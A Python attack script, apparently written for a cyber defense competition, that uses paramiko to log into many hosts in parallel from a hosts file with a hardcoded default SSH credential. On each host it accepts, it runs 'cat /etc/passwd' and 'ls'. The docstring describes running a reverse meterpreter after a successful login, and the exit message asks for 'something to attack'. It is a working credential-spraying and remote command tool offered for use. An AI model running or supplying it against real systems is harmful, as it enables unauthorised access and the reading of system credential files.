'''
This script will connect to a list of hosts from a file, attempt to login to each with a simple list of usernames and passwords.
Each successful authentication will have a command or series of command run - reverse meterpreter, etc.
'''
import paramiko
import sys
import socket
from multiprocessing import Pool


def print_command_output(raw):
    # Function to split command output received from Paramiko printing each line on a new line.
    # Will be useful for parsing output as well
    # Decode and split the raw output.  Loop it and print it.
    for i in raw.decode().split('\n'):
        print(blue + i + end_color)
        # test to find a string in the output
        if 'src' in i:
            print(red + "BOOM" + end_color)


def ssh_command(ssh):

    command = "cat /etc/passwd"
    # Invoke a shell so we can run commands
    ssh.invoke_shell()
    stdin, stdout, stderr = ssh.exec_command(command)

    print_command_output(stdout.read())

    stdin, stdout, stderr = ssh.exec_command('ls')
    # decode and split the raw output
    print_command_output(stdout.read())


def ssh_connect(host):
    suser = "cdc"
    skey = "cdc"

    try:
        s = paramiko.SSHClient()

        s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print(green + 'Connecting to {0}'.format(host) + end_color)
        s.connect(hostname=host, username=suser, password=skey, timeout=5)

        # if the connection is sucessful send to the run a command function
        ssh_command(s)

    except (paramiko.ssh_exception.NoValidConnectionsError, paramiko.ssh_exception.AuthenticationException, socket.error) as e:
        print(red + 'Connection Failed to {0}'.format(host) + end_color)
        #print(e)


if __name__=='__main__':
    if len(sys.argv) != 3:
        print('Usage: python3 ' + sys.argv[0] + ' path_to_hosts num_threads')
        sys.exit(0)

    # Declare some colors to use
    green = '\033[92m'
    yellow = '\033[93m'
    red = '\033[91m'
    blue = '\033[94m'
    end_color = '\033[0m'

    # Assign arguements to more meaningful variables
    lhost_file_path = sys.argv[1]
    threads = int(sys.argv[2])

    # open the file containing the hosts
    try:
        lhost_file = open(lhost_file_path, 'r')

    except IOError as e:
        print('Error - Unable to open {0}'.format(lhost_file_path)), e
        exit('Give me something to attack....')

    # attempt to ssh to all hosts in the host file
    with Pool(threads) as p:
        p.map(ssh_connect, lhost_file)

    lhost_file.close()
